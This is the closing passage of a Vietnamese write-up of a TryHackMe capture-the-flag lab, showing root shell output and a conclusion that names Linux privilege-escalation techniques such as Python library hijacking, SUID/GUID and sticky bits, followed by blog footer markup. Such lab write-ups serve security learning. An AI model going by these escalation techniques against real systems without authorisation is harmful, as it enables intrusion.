</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1003</span><span class="p">(</span><span class="n">hatter</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1003</span><span class="p">(</span><span class="n">hatter</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ls /root</span>
</span></span><span class="line"><span class="cl"><span class="n">user</span><span class="o">.</span><span class="n">txt</span></span></span></code></pre></div></div>
<p>Cuối cùng là lấy <em>user flag</em> và <em>root flag</em> thì nằm trong thư mục <em>alice</em>.</p>

<h2 class="relative group">Conclusion
    <div id="conclusion" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#conclusion" aria-label="Anchor">#</a>
    </span>
    
</h2>
<p>Tổng kết về bài thì phần thu thập thông tin cũng không có gì nhiều và tập trung chủ yếu vào việc nâng cao kỹ năng leo thang đặc quyền trên linux. Và tôi biết thêm 1 cách khai thác lỗi mới thông qua các thư viện python - <strong>Python Library Hijacking</strong>. Nó sẽ rất hữu ích với các tệp lệnh python được chạy với đặc quyền cao.</p>
<p>Ngoài ra, trong khi tìm hiểu về <em>SUID</em> và <em>GUID</em>, tôi biết thêm được 1 kiểu phân quyền nữa là <em>sticky bit</em>. Trong 1 vài trường hợp, nó cũng khá hữu ích để khai thác trong việc đọc hay ghi file với đặc quyền được chỉ định cụ thể.</p>
<p>Đọc thêm: <a href="https://www.thegeekstuff.com/2013/02/sticky-bit/"  target="_blank" rel="noreferrer">Sticky bit</a></p>
<p>Đọc thêm: <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities"  target="_blank" rel="noreferrer">Linux Capabilities</a></p>

          
          
          
        </div>
        
        

        

        

      </div>
    </section>

    
    <footer class="pt-8 max-w-prose print:hidden">
      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
      <div class="flex justify-between pt-3">
        <span class="flex flex-col">
          
            <a
              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
              href="/ctf/tryhackme/relevant/">
              <span class="leading-6">
                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;Tryhackme - Relevant
              </span>
            </a>
            
              <span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
                <time datetime="2021-11-26T00:00:00&#43;00:00">26 November 2021</time>
              </span>
            
          
        </span>
        <span class="flex flex-col items-end">
          
            <a
              class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
              href="/ctf/tryhackme/internal/">
              <span class="leading-6">
                Tryhackme - Internal&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
              </span>
            </a>
            
              <span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
                <time datetime="2021-12-05T00:00:00&#43;00:00">5 December 2021</time>
              </span>
            
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        


  






<div
  id="scroll-to-top"
  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
  <a
    href="#the-top"
    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top"
    title="Scroll to top">
    &uarr;
  </a>
</div>

      </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
      
      
        
          
          
      
      
      
      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 ">
        <ul class="flex list-none flex-col sm:flex-row">
          
            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
                href="/tags/"
                title="Tags">
                
                Tags
              </a>
            </li>
          
            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
              <a
                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
                href=""
                title="">
                
                
              </a>
            </li>
          
        </ul>
      </nav>
    
  
  <div class="flex items-center justify-between">
    
    
      <p class="text-sm text-neutral-500 dark:text-neutral-400">
          &copy;
          2026
          TAH
      </p>
    

    
    
      <p class="text-xs text-neutral-500 dark:text-neutral-400">
        
        
        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
      </p>
    
  </div>
  
    <script>
      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
        margin: 24,
        background: "rgba(0,0,0,0.5)",
        scrollOffset: 0,
      });
    </script>
  
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
  data-url="http://localhost:1313/">
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0">
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
  
</html>
